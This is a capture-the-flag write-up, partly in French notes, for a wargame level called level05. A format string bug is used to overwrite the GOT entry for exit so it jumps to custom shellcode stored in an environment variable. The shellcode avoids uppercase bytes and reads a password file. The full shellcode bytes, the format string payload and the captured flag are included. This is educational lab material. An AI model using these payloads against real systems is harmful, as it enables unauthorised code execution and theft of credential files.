Brouillon

need nouveau shellcode sans \x50 car to_lower.

supp ligne push eax qui fout la merde >> utiliser un bail different pour mettre le \0

nasm -f elf32 shellcode.s -o shellcode.o
ld -m elf_i386 -o shellcode shellcode.o

objdump -d -M intel shellcode | grep -Po '\s\K[0-9a-f]{2}(?=\s)' | tr -d '\n' | sed 's/\(..\)/\\x\1/g'


shellcode de zinzin :

\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x6a\x73\x68\x2e\x70\x61\x73\x68\x30\x36\x2f\x2f\x68\x65\x76\x65\x6c\x68\x72\x73\x2f\x6c\x68\x2f\x75\x73\x65\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x31\xc0\x89\xe3\x31\xc9\x31\xd2\xb0\x05\xb2\x01\xcd\x80\x89\xc3\x31\xc0\x89\xe1\xb2\x29\xb0\x03\xcd\x80\xb0\x04\xb3\x01\xb2\x29\x89\xe1\xcd\x80\xb0\x01\xcd\x80

trouver l'addresse dans la stack :

./level05
aaaa %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
aaaa 0x64 0xf7fcfac0 0xf7ec3af9 0xffffd6ef 0xffffd6ee (nil) 0xffffffff 0xffffd774 0xf7fdb000 0x61616161 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070

=> 10eme variable dans la stack                                                     


0x080497e0 addresse de exit

65535 + 57197

printf de 4294956748 - 22 - 4 - 1 char = 4294956721 chars

new idee (pck shellcode trop long) stocker shellcode dans l'environ => env -i SHELLCODE=xxxxx gdb ./level05

exec zizimou pour environnement

=> SHELLCODE => 0xffffdf6b

df6b => 57195 (- 8 pour les 8 char = 57187)
65535 - 57195 = 8340 char de + pour le 2e

python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08% 57187d%10$hn% 8340d%11$hn"' > /tmp/level05
level05@OverRide:~$ python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08% 57187d%10$hn% 8340d%11$hn"' | env -i SHELLCODE=$(python -c 'print "\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x6a\x73\x68\x2e\x70\x61\x73\x68\x30\x36\x2f\x2f\x68\x65\x76\x65\x6c\x68\x72\x73\x2f\x6c\x68\x2f\x75\x73\x65\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x31\xc0\x89\xe3\x31\xc9\x31\xd2\xb0\x05\xb2\x01\xcd\x80\x89\xc3\x31\xc0\x89\xe1\xb2\x29\xb0\x03\xcd\x80\xb0\x04\xb3\x01\xb2\x29\x89\xe1\xcd\x80\xb0\x01\xcd\x80"') ./level05

This time we instantly see a very bad printf usage that is vulnerable to format string attack. This is a classic format string attack where we will replace the address of the exit function in the GOT with the address of our shellcode. But this time our shellcode will not work because it has to get through a to_lower function. We have to cook a new shellcode that does not contain any ascii character between `@` and `[`. The new shellcode is a bit different, we cannot use push eax or a few other little subtilities but it is not that bad to make (yes it was). We place our shellcode in the environment to not be bothered with overflow or stack smashing and everything because our shellcode is big and we add NOPs to make sure we get a little bit of error margin. Last little subtility is we have to write the address in two halves because it is too big and will overflow the stdio buffer.

```bash
level05@OverRide:~$ cat /tmp/level05 | env -i SHELLCODE=$(python -c 'print "\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x6a\x73\x68\x2e\x70\x61\x73\x68\x30\x36\x2f\x2f\x68\x65\x76\x65\x6c\x68\x72\x73\x2f\x6c\x68\x2f\x75\x73\x65\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x31\xc0\x89\xe3\x31\xc9\x31\xd2\xb0\x05\xb2\x01\xcd\x80\x89\xc3\x31\xc0\x89\xe1\xb2\x29\xb0\x03\xcd\x80\xb0\x04\xb3\x01\xb2\x29\x89\xe1\xcd\x80\xb0\x01\xcd\x80"') ./level05
```
And we get our flag :
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
